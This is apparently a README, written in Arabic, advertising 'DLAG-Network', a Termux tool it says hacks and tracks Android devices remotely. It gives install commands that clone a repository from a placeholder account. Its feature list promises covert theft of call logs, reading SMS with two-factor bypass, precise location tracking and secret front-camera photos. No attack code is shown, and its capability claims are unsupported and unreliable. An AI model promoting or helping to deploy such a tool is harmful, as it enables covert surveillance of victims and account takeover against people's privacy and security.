# 🛡️ DLAG-Network v2.1 (Official)

**DLAG** هي أداة متطورة لاختراق وتتبع الأجهزة عن بعد باستخدام ثغرات النظام الحديثة 2026.

## 🚀 كيفية التثبيت (Installation)
افتح تطبيق **Termux** واكتب الأوامر التالية بالترتيب:

```bash
pkg update && pkg upgrade -y
pkg install git python -y
pip install requests
git clone [https://github.com/اسم_حسابك/DLAG](https://github.com/اسم_حسابك/DLAG)
cd DLAG
python dlag.py
## ⚙️ المميزات (Features)
* 📡 سحب سجل المكالمات (Call Logs) عن بُعد.
* 📩 قراءة رسائل الـ SMS وتخطي التحقق الثنائي.
* 📍 تحديد موقع الجهاز بدقة 5 أمتار.
* 📸 التقاط صور من الكاميرا الأمامية سراً.

## 🛠 المتطلبات (Requirements)
لضمان عمل الأداة بنجاح، يجب توفر:
1. نظام أندرويد 7.0 أو أعلى.
2. اتصال مستقر بالإنترنت.
3. **تفعيل صلاحية التخزين (Storage Permission)** في ترمكس عبر أمر: `termux-setup-storage`.
